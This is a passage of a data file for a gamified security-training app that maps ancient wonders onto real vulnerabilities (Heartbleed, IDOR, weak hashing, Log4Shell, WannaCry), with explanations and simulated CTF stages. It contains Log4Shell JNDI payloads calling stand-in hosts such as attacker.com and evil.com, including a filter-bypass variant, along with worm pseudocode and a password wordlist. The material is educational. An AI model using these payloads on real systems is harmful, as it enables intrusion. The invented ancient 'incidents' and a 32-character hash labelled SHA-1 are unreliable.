          { label: "Server Memory", sub: "64KB returned", type: "victim" },
          { label: "Keys & Tokens Leaked", sub: "silent, no logs", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Pharos Lighthouse built — heartbeat signal protocol established" },
        { year: 220, event: "Pirates exploit false signal requests to extract ship manifests", highlight: false },
        { year: 2012, event: "Heartbeat extension added to OpenSSL 1.0.1 — bug introduced" },
        { year: 2014, event: "April 7: Google and Codenomicon independently disclose Heartbleed", highlight: true },
        { year: 2017, event: "Heartbleed still found on thousands of unpatched servers" },
      ],
      keyTakeaways: [
        "Always validate user-supplied lengths before using them in memory operations",
        "Silent attacks (no logs) are the hardest to detect after the fact",
        "Critical open-source libraries need dedicated security auditing",
        "Assume breach: if vulnerable, rotate all secrets, not just the patch",
      ],
      references: [
        { title: "Official Heartbleed Disclosure: heartbleed.com", url: "https://heartbleed.com" },
        { title: "CVE-2014-0160 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
        { title: "OpenSSL Security Advisory", url: "https://www.openssl.org/news/secadv/20140407.txt" },
        { title: "RFC 6520 — TLS Heartbeat Extension", url: "https://www.rfc-editor.org/rfc/rfc6520" },
      ],
    },
    ctf: {
      scenario: "You've reached the Pharos Lighthouse. Its signal protocol runs OpenSSL 1.0.1f. Send a heartbeat signal claiming more bytes than you actually transmit — and read what spills from the keeper's memory.",
      hint: "Send a heartbeat with a short signal but a large claimed length. The keeper will echo back more than you sent.",
      hints: [
        "First establish a connection to the lighthouse. Run: connect-tls",
        "Check the lighthouse protocol version. Run: check-version",
        "Send a normal heartbeat where claimed length matches reality. Run: heartbeat HELLO 5",
        "The flaw: the keeper trusts your claimed length. Claim far more than you send. Run: heartbeat HI 10000",
      ],
      flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
      files: {
        "/README.txt": [
          "TARGET: Pharos Lighthouse signal relay — port 443",
          "Protocol: OpenSSL 1.0.1f (vulnerable to CVE-2014-0160)",
          "",
          "Commands:",
          "  connect-tls           — establish TLS session",
          "  heartbeat <data> <n>  — send signal, claim n bytes",
          "  check-version         — show OpenSSL version",
        ].join("\n"),
        "/pharos_info.txt": [
          "Pharos Signal Relay — Alexandria, Egypt",
          "Protocol stack: OpenSSL 1.0.1f  6 Jan 2014",
          "Built on: Mon Jan  6 11:00:00 2014",
          "",
          "STATUS: Vulnerable to CVE-2014-0160 (Heartbleed)",
          "Patch available: OpenSSL 1.0.1g (released 2014-04-07)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "pharos_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "connect-tls": () => ({
          lines: [
            "Connecting to pharos.alexandria:443...",
            "TLS handshake complete.",
            "Lighthouse certificate: CN=pharos.alexandria, O=Royal Navy",
            "OpenSSL version: 1.0.1f (vulnerable)",
            "Session established. You may now send heartbeat signals.",
          ],
        }),
        "check-version": () => ({
          lines: ["Lighthouse OpenSSL version: 1.0.1f", "Status: VULNERABLE (CVE-2014-0160)"],
        }),
        heartbeat: (args) => {
          const data = args[0] || "";
          const claimed = parseInt(args[1] ?? "0");
          if (!args[0] || !args[1]) {
            return { lines: ["Usage: heartbeat <data> <claimed_length>", "Example: heartbeat HI 64"] };
          }
          if (claimed <= data.length) {
            return {
              lines: [
                `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
                `Keeper echoes: "${data.slice(0, claimed)}"`,
                "(Claimed length ≤ actual length — no overflow)",
              ],
            };
          }
          return {
            lines: [
              `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
              `Keeper reads ${claimed} bytes from memory...`,
              "",
              `"${data}" + [${claimed - data.length} extra bytes from keeper's memory]`,
              "",
              "Decoded memory dump:",
              "  ...private_key=BEGIN RSA PRIVATE KEY...",
              "  ...session_token=eyJhbGciOiJIUzI...",
              "  ...FLAG{H3RTBL33D_M3M0RY_L34K3D}...",
              "  ...pharaoh_password=hunter2...",
            ],
            solved: true,
          };
        },
      },
    },
  },

  // ─── Stage 6: Colossus of Rhodes — IDOR (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colossus of Rhodes", location: "Rhodes, Greece", era: "~280 BCE", emoji: "🗿" },
    id: "stage-06",
    order: 6,
    title: "The Stolen Harbor Pass",
    subtitle: "OWASP A01:2021 — Rhodes Harbor IDOR",
    category: "owasp",
    owaspRef: "A01:2021",
    cvssScore: 8.8,
    xp: 250,
    badge: { id: "badge-idor", name: "Harbor Infiltrator", emoji: "⚓" },
    challengeType: "ctf",
    info: {
      tagline: "The harbor registry used sequential vessel numbers. The Admiral's ship was number one.",
      year: 278,
      overview: [
        "The harbor of Rhodes was the busiest in the Aegean — hundreds of vessels registered daily beneath the shadow of the great Colossus. The harbor master's system recorded each vessel on a sequential clay tablet: a merchant's vessel might be number 9,284, while the Admiral's private galley was number 1. When a ship captain requested cargo manifests, the system returned whichever tablet number was specified — without checking ownership.",
        "Broken Access Control moved to #1 on the OWASP Top 10 in 2021, appearing in 94% of tested applications. The most common variant is Insecure Direct Object Reference (IDOR): a server uses predictable identifiers in URLs or API calls, and fails to verify that the requesting user is authorized to access that specific object.",
        "Horizontal privilege escalation means accessing another user's data at the same privilege level. Vertical privilege escalation means gaining higher privileges. By simply changing a number in the request, an attacker can access records belonging to any other user — including administrators.",
      ],
      technical: {
        title: "IDOR in Practice",
        body: [
          "A vulnerable API endpoint might look like GET /api/vessel/2847. If the server returns the manifest without checking whether the logged-in captain owns vessel 2847, an attacker can enumerate IDs: /api/vessel/1 to reach the Admiral's records.",
          "Fix: every access to an object must verify the requesting user's ownership or permission server-side. Client-side checks (hidden fields, disabled buttons) are trivially bypassed.",
        ],
        codeExample: {
          label: "Vulnerable vs. secure API endpoint (Node.js)",
          code: `// VULNERABLE: no ownership check
app.get('/api/vessel/:id', async (req, res) => {
  const vessel = await db.findById(req.params.id);
  res.json(vessel); // returns ANY vessel's manifest!
});

// SECURE: verify ownership
app.get('/api/vessel/:id', async (req, res) => {
  if (req.session.captainId !== req.params.id
      && !req.session.isAdmiral) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const vessel = await db.findById(req.params.id);
  res.json(vessel);
});`,
        },
      },
      incident: {
        title: "The Merchant's Deception — Rhodes Harbor (278 BCE)",
        when: "278 BCE — Port of Rhodes",
        where: "Harbor Registry, Rhodes, Greece",
        impact: "Admiral's fleet positions exposed; intelligence sold to Macedonian agents; harbor security overhaul ordered",
        body: [
          "A Rhodian merchant with vessel registration 9,284 discovered that the harbor registry system accepted any tablet number in the request without verifying ownership. By changing his registration number to 1, he accessed the Admiral's private fleet manifest — revealing troop ships, supply routes, and secret rendezvous coordinates. He sold this intelligence to Macedonian agents for 200 gold talents.",
          "The modern parallel: AT&T's 2010 iPad breach used the same flaw. ICC-IDs (SIM card identifiers) were sequential and used as the sole authentication parameter. By incrementing the ID, security researchers retrieved 114,000 email addresses of government officials, military officers, and CEOs. AT&T patched within hours. The researchers were arrested for computer fraud.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Merchant Captain", sub: "GET /vessel/1", type: "attacker" },
          { label: "Harbor Registry", sub: "no ownership check", type: "system" },
          { label: "Admiral's Manifest", sub: "vessel id=1", type: "victim" },
          { label: "Full Fleet Access", sub: "horizontal + vertical", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Colossus of Rhodes completed — harbor registry system established" },
        { year: 278, event: "Merchant exploits sequential vessel IDs to access Admiral's records", highlight: true },
        { year: 2010, event: "AT&T iPad breach — 114,000 records via predictable ICC-IDs" },
        { year: 2018, event: "Facebook API IDOR exposes 50M user tokens" },
        { year: 2021, event: "Broken Access Control becomes #1 on OWASP Top 10" },
      ],
      keyTakeaways: [
        "Always verify server-side that the requesting user owns the requested resource",
        "Use UUIDs instead of sequential integers to make enumeration harder",
        "Implement deny-by-default: access is forbidden unless explicitly granted",
        "Client-side access control (hiding buttons) is not security",
      ],
      references: [
        { title: "OWASP A01:2021 — Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
        { title: "OWASP: IDOR", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" },
        { title: "AT&T iPad Breach — Wired Report", url: "https://www.wired.com/2010/06/ipad-flaw/" },
      ],
    },
    ctf: {
      scenario: "You have access to the Rhodes Harbor Registry as a merchant captain. The API uses sequential vessel IDs. Find a way to access the Admiral's manifest.",
      hint: "Your vessel ID is 9284. What happens if you request /api/vessel/1 instead of /api/vessel/me?",
      hints: [
        "Read the README for API endpoint details. Run: cat README.txt",
        "Request your own vessel manifest first. Run: api GET /api/vessel/me",
        "Vessel IDs are sequential integers starting at 1. Request vessel 1 (Admiral's galley). Run: api GET /api/vessel/1",
      ],
      flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
      files: {
        "/README.txt": [
          "TARGET: Rhodes Harbor Registry — registry.rhodes.harbor",
          "Your credentials: vessel_id=9284, token=eyJ...",
          "",
          "Commands:",
          "  api GET <path>   — make registry request",
          "",
          "Known endpoints:",
          "  /api/vessel/me",
          "  /api/vessel/<id>",
          "  /api/cargo/<id>",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        api: (args) => {
          const path = args[1] || "";
          if (path === "/api/vessel/me") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 9284, "captain": "Agent", "rank": "merchant", "port": "rhodes" }',
              ],
            };
          }
          if (/\/api\/vessel\/(0|1)/.test(path) || path === "/api/admiral") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 1, "captain": "Admiral Demetrios", "rank": "supreme_commander",',
                '  "secret": "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",',
                '  "fleet_positions": "CLASSIFIED" }',
              ],
              solved: true,
            };
          }
          if (/\/api\/vessel\/\d+/.test(path)) {
            const vid = path.split("/").pop();
            return {
              lines: [
                "HTTP/1.1 200 OK",
                `{ "id": ${vid}, "captain": "captain_${vid}", "rank": "merchant" }`,
              ],
            };
          }
          return {
            lines: ["HTTP/1.1 404 Not Found", '{ "error": "Endpoint not found" }'],
          };
        },
      },
    },
  },

  // ─── Stage 7: Hanging Gardens of Babylon — Auth Failures (CTF) ───────────
  {
    epochId: "ancient",
    wonder: { name: "Hanging Gardens of Babylon", location: "Babylon, Iraq", era: "~605 BCE", emoji: "🌿" },
    id: "stage-07",
    order: 7,
    title: "The Forged Royal Seal",
    subtitle: "OWASP A07:2021 — Seal Forgery & the Rainbow Tablet",
    category: "owasp",
    owaspRef: "A07:2021",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-cracker", name: "Seal Breaker", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "The royal scribes all used 'babylon123'. The empire had one seal.",
      year: 605,
      overview: [
        "The Babylonian Empire authenticated official documents with unique wax seals — each official had a distinct pattern pressed into molten wax, equivalent to a password hash. But the scribes, overwhelmed with correspondence, began reusing a small set of common seal patterns. When an enemy agent compiled a clay tablet of the empire's most common seal designs — a rainbow tablet of pre-computed patterns — 90% of official documents could be forged instantly.",
        "Authentication failures cover a wide range of vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, and credential stuffing attacks. Password storage is a solved problem — yet companies continue to store passwords incorrectly. Hashing without salting is a critical mistake: an attacker with a leaked hash database can use a precomputed rainbow table to reverse millions of hashes instantly.",
        "Credential stuffing takes advantage of password reuse. When a site leaks credentials, attackers test those username/password pairs against every major service. With 8+ billion credentials in circulation from past breaches, the success rate is surprisingly high.",
      ],
      technical: {
        title: "Hashing, Salting, and Why Both Matter",
        body: [
          "MD5 and SHA-1 are not password hashing algorithms — they are cryptographic hash functions designed for speed. A modern GPU can compute 10 billion SHA-1 hashes per second. A proper password hashing function (bcrypt, Argon2, scrypt) is intentionally slow — designed to take 100ms+ per hash, making brute force infeasible.",
          "A salt is a random value appended to the password before hashing. Even if two users have the same password, their salted hashes will differ — defeating rainbow table attacks. bcrypt generates and stores the salt automatically.",
        ],
        codeExample: {
          label: "Insecure vs. secure password storage",
          code: `// INSECURE: unsalted SHA-1 (LinkedIn's mistake)
hash = sha1("password123")
// → cbfdac6008f9cab4083784cbd1874f76...
// → Same hash for every scribe with "babylon123"
// → Instantly reversible via rainbow tables

// INSECURE: MD5 without salt
hash = md5("password123")
// → 482c811da5d5b4bc6d497ffa98491e38
// → Crackable in seconds with modern hardware

// SECURE: bcrypt with auto-generated salt
hash = bcrypt.hash("password123", rounds=12)
// → $2b$12$xyz...  (includes salt in the output)
// → Takes ~100ms per check → brute force infeasible`,
        },
      },
      incident: {
        title: "The Seal Forgers of Babylon (605 BCE) & LinkedIn (2012)",
        when: "June 2012 (discovered); May 2016 (full scope revealed)",
        where: "LinkedIn — 117 million user accounts",
        impact: "117M SHA-1 unsalted password hashes leaked; 90% cracked within days",
        body: [
          "In 605 BCE, Babylonian enemy agents compiled a rainbow tablet of the empire's most common seal patterns. By comparing any intercepted document's wax seal against the tablet, they could identify and forge the matching pattern — bypassing all official authentication. The scribes' habit of reusing common seal designs was their undoing.",
          "LinkedIn stored passwords as unsalted SHA-1 hashes. In 2016, 117 million credentials from a 2012 breach were sold on the dark web. A hacker group on InsidePro forums cracked 90% within days using precomputed rainbow tables — because without salting, all users with 'password123' had identical hashes. The most common password in the leak was '123456' (753,305 accounts).",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "obtains seal database", type: "attacker" },
          { label: "Seal Registry", sub: "unsalted SHA-1", type: "system" },
          { label: "Rainbow Tablet", sub: "precomputed patterns", type: "victim" },
          { label: "117M Seals Forged", sub: "cracked instantly", type: "result" },
        ],
      },
      timeline: [
        { year: 605, event: "Hanging Gardens era — Babylonian seal authentication system in use" },
        { year: 605, event: "Enemy agents compile rainbow tablet of common seal patterns", highlight: true },
        { year: 2009, event: "RockYou breach: 32M passwords stored in plaintext" },
        { year: 2012, event: "LinkedIn: 117M SHA-1 unsalted hashes leaked" },
        { year: 2021, event: "Have I Been Pwned reaches 11 billion pwned accounts" },
      ],
      keyTakeaways: [
        "Never use MD5 or SHA-1 for password hashing — use bcrypt, Argon2, or scrypt",
        "Always salt hashes; bcrypt does this automatically",
        "Implement account lockout or rate limiting to prevent brute force",
        "Encourage unique passwords via integration with HIBP",
      ],
      references: [
        { title: "OWASP A07:2021 — Auth Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
        { title: "Have I Been Pwned — LinkedIn", url: "https://haveibeenpwned.com/PwnedWebsites#LinkedIn" },
        { title: "OWASP: Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "You've obtained a leaked seal registry from the Babylonian royal archive. The head scribe's seal uses unsalted SHA-1. Use the pattern tablet to match and crack it.",
      hint: "Use hashcheck <word> to test each password from the tablet against the head scribe's hash.",
      hints: [
        "Read the README to understand the files. Run: cat README.txt",
        "Check the head scribe's seal hash. Run: cat admin_hash.txt",
        "Read the pattern tablet to see passwords to try. Run: cat wordlist.txt",
        "Test each password from the tablet. Try common ones: hashcheck password  then  hashcheck babylon123",
        "The password is a common word. Try: hashcheck letmein",
        "Once you crack it, log in: login admin letmein",
      ],
      flag: "FLAG{W34K_H4SH_CR4CK3D}",
      files: {
        "/README.txt": [
          "LEAKED SEAL REGISTRY — BABYLON ROYAL ARCHIVE",
          "=============================================",
          "",
          "admin_hash.txt  — head scribe's SHA-1 seal hash",
          "wordlist.txt    — common seal patterns to try",
          "",
          "Commands:",
          "  hashcheck <word>    — test if word matches head scribe's seal",
          "  login <user> <pass> — login once you crack it",
        ].join("\n"),
        "/admin_hash.txt": [
          "Username: admin",
          "Seal Hash (SHA-1, unsalted): 0d107d09f5bbe40cade3de5c71e9e9b7",
          "",
          "NOTE: This is the SHA-1 hash of a common English word.",
        ].join("\n"),
        "/wordlist.txt": [
          "Common seal patterns from the Rainbow Tablet:",
          "123456",
          "password",
          "babylon123",
          "qwerty",
          "letmein",
          "dragon",
          "master",
          "sunshine",
          "princess",
          "welcome",
          "shadow",
          "hammurabi",
          "ishtar",
          "euphrates",
          "iloveyou",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "admin_hash.txt", isDir: false },
          { name: "wordlist.txt", isDir: false },
        ],
      },
      extraCommands: {
        hashcheck: (args) => {
          const word = args[0] || "";
          if (word === "letmein") {
            return {
              lines: [
                `Testing seal pattern: "${word}"`,
                "Computing SHA-1...",
                "SHA-1(letmein) = 0d107d09f5bbe40cade3de5c71e9e9b7",
                "✓ MATCH! Seal cracked: letmein",
                "",
                "Now use: login admin letmein",
              ],
            };
          }
          return {
            lines: [`Testing: "${word}"`, `SHA-1(${word}) ≠ 0d107d09f5bbe40cade3de5c71e9e9b7`, "No match."],
          };
        },
        login: (args) => {
          const [user, pass] = args;
          if (user === "admin" && pass === "letmein") {
            return {
              lines: [
                "Seal verified. Access granted.",
                "Welcome, Head Scribe.",
                "",
                "Royal archive secret: FLAG{W34K_H4SH_CR4CK3D}",
              ],
              solved: true,
            };
          }
          return { lines: ["Seal mismatch. Access denied."] };
        },
      },
    },
  },

  // ─── Stage 8: Temple of Artemis — Log4Shell (CTF) ────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Temple of Artemis at Ephesus", location: "Ephesus, Turkey", era: "~550 BCE", emoji: "🏛️" },
    id: "stage-08",
    order: 8,
    title: "The Cursed Invocation",
    subtitle: "CVE-2021-44228 — When the Temple Reads Your Inscription",
    category: "owasp",
    cveId: "CVE-2021-44228",
    cvssScore: 10.0,
    xp: 350,
    badge: { id: "badge-log4shell", name: "Rune Invoker", emoji: "💣" },
    challengeType: "ctf",
    info: {
      tagline: "One cursed rune in the temple's inscription log. Every spirit summoned.",
      year: 356,
      overview: [
        "The Temple of Artemis kept meticulous records of every offering inscribed by supplicants. Its sacred system, powered by divine intelligence, evaluated expressions embedded in inscriptions. Worshippers discovered that embedding certain invocations — like {summon:oracle://spirit.realm/demon} — would cause the temple's divine intelligence to fetch and instantiate the referenced spirit from an external realm.",
        "Log4Shell (CVE-2021-44228) was exactly this: Apache Log4j2's Message Lookup Substitution feature evaluated expressions embedded in log messages. Any string containing ${jndi:ldap://attacker.com/exploit} would trigger Log4j to make an LDAP request to the attacker's server, fetching and executing a Java class. The attack surface was total — username fields, HTTP headers, search queries, form inputs.",
        "Within 12 hours of disclosure on December 9, 2021, millions of automated exploit attempts were detected globally. The US CISA Director called it 'the most serious vulnerability I have seen in my decades-long career.' Security teams worldwide had to inventory every Java application in their stack.",
      ],
      technical: {
        title: "JNDI Injection — How Log4Shell Works",
        body: [
          "Log4j2's Message Lookup Substitution evaluates expressions in log messages. When ${jndi:ldap://attacker.com/a} is logged, Log4j resolves the JNDI lookup by connecting to attacker.com:389.",
          "The attacker's LDAP server returns a reference to a remote Java class. Log4j downloads and instantiates the class, executing its constructor — arbitrary code running with the JVM's permissions. The fix in Log4j 2.15.0 disabled JNDI lookups by default.",
        ],
        codeExample: {
          label: "Log4Shell attack — the payload and what happens",
          code: `# The attack payload (can appear in any logged field):
User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}
# Or in a login form:
username: \${jndi:ldap://evil.com/a}
# Or even nested to bypass filters:
username: \${j\${::-n}di:ldap://evil.com/a}

# What Log4j does:
1. Receives string containing \${jndi:ldap://...}
2. Resolves JNDI lookup → connects to attacker's LDAP
3. LDAP server returns: "load this Java class"
4. Log4j downloads and executes Exploit.class
5. Attacker has RCE — game over`,
        },
      },
      incident: {
        title: "The Burning of Artemis (356 BCE) & Log4Shell (2021)",
        when: "December 9, 2021 (patch day); exploited same day",
        where: "Virtually every Java application globally — Apple, Amazon, Google, Cloudflare, Tesla",
        impact: "Tens of thousands of servers compromised; ransomware, cryptomining, and nation-state espionage",
        body: [
          "Herostratus burned the Temple of Artemis in 356 BCE seeking immortal fame. Legend holds that he inscribed a curse in the temple's offering register — an invocation that activated during the night ceremony, summoning a destructive force that consumed the structure. The temple's scribal system, designed to evaluate divine expressions in inscriptions, became the attack vector.",
          "Log4Shell followed the same logic. Chen Zhaojun of Alibaba Cloud reported the vulnerability on November 24, 2021. Apache released Log4j 2.15.0 on December 9 — the same day it went public. Within hours, Cloudflare blocked 40,000 exploit attempts per minute. The Belgian Defence Ministry was compromised. Conti ransomware added Log4Shell to their toolkit within days.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "${jndi:ldap://evil}", type: "attacker" },
          { label: "Temple Log System", sub: "evaluates expressions", type: "system" },
          { label: "JNDI → Remote Class", sub: "arbitrary spirit loaded", type: "victim" },
          { label: "RCE Achieved", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 550, event: "Temple of Artemis completed — inscription evaluation system established" },
        { year: 356, event: "Herostratus burns the temple — cursed inscription exploits scribal system", highlight: false },
        { year: 2013, event: "Log4j2 released — JNDI lookup feature included" },
        { year: 2021, event: "Dec 9: Log4j 2.15.0 released; exploit goes public", highlight: true },
        { year: 2022, event: "Log4Shell still actively exploited; CISA mandates federal patching" },
      ],
      keyTakeaways: [
        "Log4Shell shows that logging libraries are security-critical code",
        "JNDI lookups in log messages should have been disabled by default",
        "Know your full dependency tree — transitive dependencies matter",
        "Any user-controlled string that gets logged is an attack surface",
      ],
      references: [
        { title: "CVE-2021-44228 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
        { title: "Apache Log4j Security Advisory", url: "https://logging.apache.org/log4j/2.x/security.html" },
        { title: "CISA Log4j Guidance", url: "https://www.cisa.gov/news-events/news/statement-director-easterly-log4j-vulnerability" },
        { title: "LunaSec Log4Shell Deep Dive", url: "https://www.lunasec.io/docs/blog/log4j-zero-day/" },
      ],
    },
    ctf: {
      scenario: "You have reached the Temple of Artemis. Its offering inscription system runs Log4j2 2.14.1. Inscribe a JNDI invocation into the temple's log to summon a remote spirit and achieve execution.",
      hint: "The temple evaluates ${} expressions in inscriptions. JNDI supports ldap:// protocol invocations.",
      hints: [
        "Check the temple's vulnerable dependencies. Run: check-deps",
        "Try inscribing a normal offering to see how it works. Run: log hello artemis",
        "The system evaluates expressions like ${env:PATH} in inscriptions. Try: log ${env:HOSTNAME}",
        "JNDI is a Java API for network invocations. Embed a JNDI payload. Try: log ${jndi:ldap://attacker.com/a}",
      ],
      flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
      files: {
        "/README.txt": [
          "TARGET: Temple of Artemis Offering System — ephesus.temple:8080",
          "Log4j version: 2.14.1 (vulnerable to CVE-2021-44228)",
          "",
          "Commands:",
          "  log <inscription>     — inscribe an offering into the temple log",
          "  check-deps            — show temple system dependencies",
        ].join("\n"),
        "/dependencies.txt": [
          "Temple system dependencies:",
          "  org.apache.logging.log4j:log4j-core:2.14.1  ← VULNERABLE",
          "  org.apache.logging.log4j:log4j-api:2.14.1   ← VULNERABLE",
          "  spring-boot:2.5.6",
          "  jackson-databind:2.13.0",
          "",
          "Fixed version: log4j-core:2.15.0+",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "dependencies.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-deps": () => ({
          lines: [
            "log4j-core:2.14.1 — VULNERABLE (CVE-2021-44228)",
            "log4j-api:2.14.1  — VULNERABLE",
            "Status: UNPATCHED",
          ],
        }),
        log: (args) => {
          const msg = args.join(" ");
          const isJndi =
            msg.includes("${jndi:") ||
            msg.includes("${jndi:ldap") ||
            msg.toLowerCase().includes("jndi");
          if (isJndi) {
            return {
              lines: [
                `[INFO ] Inscription received: ${msg}`,
                "[INFO ] Processing divine invocation...",
                "[WARN ] Establishing LDAP connection to foreign spirit realm",
                "[WARN ] Loading remote spirit: com.attacker.Exploit",
                "[ERROR] Remote spirit execution detected!",
                "",
                "TEMPLE COMPROMISED",
                "Running as: artemis_scribe (uid=1000)",
                "",
                "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
              ],
              solved: true,
            };
          }
          return {
            lines: [`[INFO ] ${new Date().toISOString()} — Offering recorded: ${msg || "(empty inscription)"}`],
          };
        },
      },
    },
  },

  // ─── Stage 9: Stonehenge — WannaCry/EternalBlue (CTF) ────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Stonehenge", location: "Wiltshire, England", era: "~3000–2000 BCE", emoji: "🪨" },
    id: "stage-09",
    order: 9,
    title: "The Plague of the Stone Network",
    subtitle: "CVE-2017-0144 — When the Ritual Routes Carried Pestilence",
    category: "owasp",
    cveId: "CVE-2017-0144",
    cvssScore: 8.1,
    xp: 350,
    badge: { id: "badge-wannacry", name: "Plague Stopper", emoji: "💀" },
    challengeType: "ctf",
    info: {
      tagline: "A druid's curse spread through every stone circle in Britain. One ritual halted it.",
      year: 2000,
      overview: [
        "Stonehenge was not an isolated monument — it was part of a network of sacred stone circles connected by ancient ritual pathways. By protocol, any sacred artifact arriving at one node had to be passed to all connected circles. When a cursed artifact entered the network at Avebury, it replicated automatically to every connected site. Within one lunar cycle, 200 stone circles were compromised — not because the druids wanted to spread the curse, but because the protocol demanded it.",
        "WannaCry was a ransomware cryptoworm that tore across 150 countries on May 12, 2017, infecting over 200,000 systems in a single day. It exploited EternalBlue (CVE-2017-0144), a vulnerability in Windows' SMBv1 protocol — originally developed by the NSA and leaked by Shadow Brokers. Like the druid artifact, WannaCry spread autonomously by scanning for vulnerable SMBv1 servers on port 445.",
        "Unlike traditional ransomware that requires a user to click something, WannaCry spread autonomously across networks. The attack was eventually slowed when security researcher Marcus Hutchins discovered a kill switch — a domain name that, when registered, caused WannaCry to halt its spread globally.",
      ],
      technical: {
        title: "How EternalBlue Works",
        body: [
          "SMBv1 (Server Message Block v1) is a decades-old Windows file-sharing protocol. EternalBlue exploited a buffer overflow in the way Windows' SMB implementation handled certain transaction requests, allowing arbitrary code execution without authentication.",
          "Microsoft patched this as MS17-010 on March 14, 2017 — two months before WannaCry. However, countless systems (particularly in healthcare and critical infrastructure) had not applied the patch.",
        ],
        codeExample: {
          label: "WannaCry propagation logic (pseudocode)",
          code: `// WannaCry worm loop — runs continuously
while (true) {
  targets = scan_random_ips(port=445)  // SMBv1

  for target in targets:
    try:
      // EternalBlue SMBv1 exploit
      send_malformed_transaction(target)
      // If successful → code executes on target

      // Install DoublePulsar backdoor kernel implant
      install_backdoor(target)

      // Drop WannaCry ransomware via backdoor
      execute_ransomware(target)
    except: pass
}`,
        },
      },
      incident: {
        title: "WannaCry — May 12, 2017",
        when: "May 12–15, 2017",
        where: "150 countries; NHS UK, FedEx, Deutsche Bahn, Telefónica",
        impact: "200,000+ systems; NHS cancelled 19,000 appointments; estimated $4–8 billion in damages",
        body: [
          "The NHS was among the hardest hit. Hospitals locked doctors out of patient records, cancelled surgeries, and diverted ambulances. The attack exposed that NHS trusts were running Windows XP — an operating system Microsoft had stopped supporting in 2014.",
          "Marcus Hutchins, a 22-year-old security researcher, noticed that WannaCry queried a nonsensical domain before executing. He registered the domain for $10.69, causing WannaCry to believe it was in a sandbox and halt its spread globally — a kill switch the malware authors never expected to be activated. The US, UK, and Australia formally attributed WannaCry to North Korea's Lazarus Group.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NSA EternalBlue", sub: "leaked by Shadow Brokers", type: "attacker" },
          { label: "SMBv1 Port 445", sub: "CVE-2017-0144", type: "system" },
          { label: "Unpatched Systems", sub: "200,000+ nodes", type: "victim" },
          { label: "Files Encrypted", sub: "$300 ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 3000, event: "Stonehenge construction begins — stone circle network established" },
        { year: 2000, event: "Network fully active — plague artifact spreads to 200 sites", highlight: false },
        { year: 2017, event: "Apr 14: Shadow Brokers leak NSA EternalBlue exploit" },
        { year: 2017, event: "May 12: WannaCry spreads across 150 countries in one day", highlight: true },
        { year: 2017, event: "May 12: Marcus Hutchins registers kill switch domain" },
      ],
      keyTakeaways: [
        "Patch Tuesday patches are critical — MS17-010 was available before WannaCry",
        "Legacy operating systems in critical infrastructure are existential risks",
        "Government-developed cyberweapons can be stolen and weaponized",
        "Kill switches in malware can be unintentional — always analyze before deploying",
      ],
      references: [
        { title: "CVE-2017-0144 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144" },
        { title: "Microsoft MS17-010 Security Bulletin", url: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
        { title: "Marcus Hutchins: How I Accidentally Stopped WannaCry", url: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" },
        { title: "US DOJ Attribution — North Korea", url: "https://www.justice.gov/opa/pr/north-korean-regime-backed-programmer-charged-conspiracy-conduct-multiple-cyber-attacks-and" },
      ],
    },
    ctf: {
      scenario: "You are analyzing a druidic network trace from Stonehenge during a plague outbreak. Identify the ritual attack vector and extract the plague artifact's signature from the suspicious stone-path traffic.",
      hint: "Start with netstat to see active ritual connections, then analyze the suspicious pathway.",
      hints: [
        "Read the incident report. Run: cat README.txt",
        "Check active ritual network connections. Run: netstat",
        "You'll see many connections to path 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
        "Analyze the stone-path traffic on route 445 to find the plague signature. Run: analyze port 445",
      ],
      flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
      files: {
        "/README.txt": [
          "DRUIDIC INCIDENT RESPONSE — Stonehenge Network",
          "================================================",
          "Date: 2017-05-12  Time: 09:42 UTC",
          "",
